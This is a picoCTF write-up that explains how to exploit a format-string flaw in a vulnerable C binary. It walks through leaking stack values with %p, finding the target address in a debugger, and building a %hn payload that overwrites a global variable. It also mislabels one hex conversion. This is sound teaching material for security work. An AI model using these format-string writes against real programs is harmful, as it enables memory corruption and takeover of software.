# Format Strings 2
## Pico CTF -- Medium


Format Strings 2 is a medium fstrings challenge that requires us to overwrite a in the challenge binary.

We are given the [compiled binary](vuln), and the [source code](vuln.c).

This binary does not have ASLR activated.

Notice, the source code declares a variable **sus**, and then checks that variable agains a different value. In order to retrieve the flag, we must find a way to overwrite the value of that variable.

    int sus = 0x21737573;

    int main() {

    .
    .
    .

        if (sus == 0x67616c66) {
            // Read in the flag
        }
    }

Notice also, that the program asks for user input, and the reflects that input back to us using a **printf** call.

    printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
    fflush(stdout);
    scanf("%1024s", buf);
    printf("Here's your input: ");
    printf(buf);
    printf("\n");
    fflush(stdout);

The **printf** function is supposed to take as a parameter *[format specifiers](https://cplusplus.com/reference/cstdio/printf/)* which tell the function how to display text.

Consider the following example of a safe prinf call:

    printf(%s, buf)

Notice how this differs from the printf call in the vulnerable program.

    printf(buf);

Because this printf call does not include a format specifier, we can add arbitrary format specifiers to our input, and the program will process them.

If we supply the program with '%p' as an input for example, we can leak memory addresses from inside the program.

    You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
    %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p 
    Here's your input: 0x402075.(nil).(nil).0x402073.0x7ffff7f96a80.0x7ffff7ffe668.0x7fff00000001.0x7ffff7ffe2e0.0xffffffff.0x7ffff7dd4678.0x7ffff7fc2400.0x1.0x7fffffffd7f0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0xffffff00.(nil).(nil).(nil).(nil).(nil).(nil).(nil).(nil)
    sus = 0x21737573
    You can do better!

When the series of '%p' values are processed, the program looks at the first 6 argument registers respectively, then values on the stack, interprets those values as a pointer, and then prints them. See [x64 calling convetions](https://en.wikipedia.org/wiki/X86_calling_conventions) for more information on from where these values are printed.

In addition to leaking memory, we can also write *new* values to the stack, using the '%n' specifier, at the location pointed to by '%n'.

More specifically, '%n' writes the number of characters in the string so far, to whatever pointer value '%n' points to.

For example,

    AAAA%5$n

Writes a value of 4 to the memory address at an offset of 5 relative to printf.

Therefore, if we can find the address of **sus** and the location in memory where our input lands, we can input the address of **sus**, point %n to our input, and pad the payload such that **sus** is overwritten with an arbitrary value.

Using a recognizable input, and a series of '%p' specifiers to leak memory, I found that our input lands 14 blocks away from the prinf call.

    You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
    AAAAAAAA%14$p
    Here's your input: AAAAAAAA0x4141414141414141
    sus = 0x21737573
    You can do better!

In a debugger, I found the address of **sus**

    pwndbg> info addr sus
    Symbol "sus" is at 0x404060 in a file compiled without debugging.

Recall, we write a value of 4 to a specific location by providing a string of length 4.

Recall also, that the required value of sus is 0x67616c66. This would appear to requre a string of length 1,734,437,990 which is unreasonable.

Fortunately, C provides a number of length sub specifiers. We can therefore use the h subspecifier, '%hn' to split this job into two smaller pieces. Additionally, we can use '%NUMx' to automattically pad strings to length NUM.

We can now construct an [exploit](exploit.py) that does precisely this.

Since we are splitting our write into two peices, we need to write our fist chunk **0x6761** to **0x404060 + 2**, and **0x6c66** to **0x404060**.

To write our first chunk, we can use %26465x to write 26465 in decimal (0x6c66 in hex) to %POS$hn where POS is the position in memory where we place our target address, relative to printf. In order to reach the target address, which we supply at the end of our input, we also need to make sure each part of the payload is padded to 8 bytes by including some additional characters.

To write our second chunk, we need to subtract the number of bytes we have already written from the value we want. Everything else about this second chunk, is identical in principle to how we contructed the first.

    payload = b"%26465x%18$hnAAA" + b"%1282x%19$hnAAAA" + p64(target_addr + 2) + p64(target_addr)


Alternatively, we could use pwntools [fmtstr](https://docs.pwntools.com/en/stable/fmtstr.html) to automate some of this process.